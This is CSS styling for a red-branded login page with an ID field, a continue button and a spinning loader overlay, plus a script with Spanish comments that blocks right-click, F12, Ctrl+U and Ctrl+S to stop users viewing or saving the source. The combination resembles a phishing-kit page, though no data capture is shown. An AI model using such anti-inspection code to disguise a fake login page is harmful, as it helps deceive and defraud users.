<style>
  :root { --red:#f3192b; --ink:#111; --muted:#87909b; }
  * { box-sizing: border-box; }
  html, body { margin:0; min-height:100%; font-family: Arial, Helvetica, sans-serif; color:var(--ink); }
  body { min-height:100vh; display:flex; flex-direction:column; background:#f8f6f3; }
  .topbar { height:43px; flex:0 0 43px; background:var(--red); color:#fff; display:flex; align-items:center; justify-content:space-between; padding:0 max(7%, 18px); }
  .brand { display:flex; align-items:center; gap:10px; color:white; font-size:25px; font-weight:700; letter-spacing:1px; }
  .brand-mark { font-size:21px; }
  .language { font-size:12px; color:white; }
  main { flex:1; display:flex; flex-direction:column; align-items:center; padding: clamp(48px, 8vh, 105px) 20px 22px; background:radial-gradient(ellipse at 22% 58%, #eee5dc 0, transparent 36%), radial-gradient(ellipse at 78% 45%, #e9e1d4 0, transparent 35%), #fff; }
  h1 { font-size:clamp(25px, 3vw, 36px); font-weight:400; text-align:center; margin:0 0 clamp(58px, 8vh, 88px); }
  .login { width:min(100%, 440px); display:flex; flex-direction:column; align-items:center; }
  .id-input { width:min(100%, 250px); border:0; border-bottom:2px solid var(--red); border-radius:0; background:transparent; padding:10px 4px 7px; text-align:center; font-size:14px; outline:none; color:#111; }
  .id-input::placeholder { color:#111; opacity:1; }
  .continue { margin-top:clamp(45px, 8vh, 78px); width:140px; min-height:36px; border:0; border-radius:24px; background:var(--red); color:white; font-size:13px; cursor:pointer; }
  .links { display:flex; justify-content:center; flex-wrap:wrap; gap:12px 27px; margin-top:40px; font-size:12px; }
  .links a, .privacy a { color:var(--red); text-decoration:none; }
  .privacy { width:min(100%, 500px); margin-top:32px; color:var(--muted); font-size:12px; line-height:1.25; }
  .privacy a { color:var(--red); }
  footer { min-height:33px; background:#050505; color:#fff; display:flex; justify-content:space-between; align-items:center; gap:12px; padding:8px 27px; font-size:11px; font-weight:600; }
  @media (max-width:600px) {
    .topbar { padding:0 14px; }
    .brand { font-size:20px; gap:6px; }
    .language { font-size:11px; }
    main { padding:58px 18px 28px; }
    h1 { margin-bottom:54px; }
    .continue { margin-top:48px; }
    .links { gap:15px 18px; margin-top:34px; }
    .privacy { margin-top:30px; font-size:11px; }
    footer { padding:10px 14px; font-size:10px; flex-wrap:wrap; }
  }
</style>



<style>
  :root {
    --red: #f3192b;
    --ink: #111;
    --muted: #87909b;
  }

  * {
    box-sizing: border-box;
  }

  html, body {
    margin: 0;
    min-height: 100%;
    font-family: Arial, Helvetica, sans-serif;
    color: var(--ink);
  }

  body {
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    background: #f8f6f3;
  }

  .topbar {
    min-height: 43px;
    background: var(--red);
    display: flex;
    align-items: center;
    padding: 0 7%;
  }

  .brand img {
    height: 43px;
    width: auto;
    display: block;
  }

  main {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
    text-align: center;
    background:
      radial-gradient(ellipse at 22% 58%, #eee5dc 0, transparent 36%),
      radial-gradient(ellipse at 78% 45%, #e9e1d4 0, transparent 35%),
      #fff;
  }

  h1 {
    font-size: clamp(25px, 5vw, 36px);
    font-weight: 400;
  }

  .demo-note {
    max-width: 420px;
    color: #555;
    line-height: 1.6;
  }

  footer {
    background: #050505;
    color: #fff;
    text-align: center;
    padding: 12px;
    font-size: 11px;
  }

  /* Fondo semitransparente */
  .overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 0, 0, 0.60);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 24px;
    z-index: 9999;
  }

  /* Aro giratorio y logo central */
  .loader {
    position: relative;
    width: 140px;
    height: 140px;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 24px;
  }

  .circle {
    position: absolute;
    inset: 0;
    border: 6px solid rgba(255, 255, 255, 0.3);
    border-top-color: #e30613;
    border-right-color: #e30613;
    border-radius: 50%;
    animation: spin 1.1s linear infinite;
  }

  .loader img {
    width: 90px;
    height: 90px;
    object-fit: contain;
    border-radius: 50%;
    position: relative;
    z-index: 1;
    background: rgba(255, 255, 255, 0.9);
    padding: 5px;
  }

  .overlay .text {
    max-width: 340px;
    color: white;
    font-size: 16px;
    line-height: 1.5;
    text-align: center;
  }

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }

  @media (max-width: 600px) {
    .topbar {
      padding: 0 14px;
    }

    .overlay .text {
      font-size: 15px;
    }

    .loader {
      width: 120px;
      height: 120px;
    }

    .loader img {
      width: 76px;
      height: 76px;
    }
  }

  @media (prefers-reduced-motion: reduce) {
    .circle {
      animation-duration: 3s;
    }
  }
</style>

 <script> 
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Bloquear F12, Ctrl+Shift+I, Ctrl+U, Ctrl+S
    document.onkeydown = function(e) {
        if (
            e.keyCode == 123 || // F12
            (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) || // Ctrl+Shift+I
            (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) || // Ctrl+U
            (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) // Ctrl+S
        ) {
            e.preventDefault();
            return false;
        }
    }
</script>
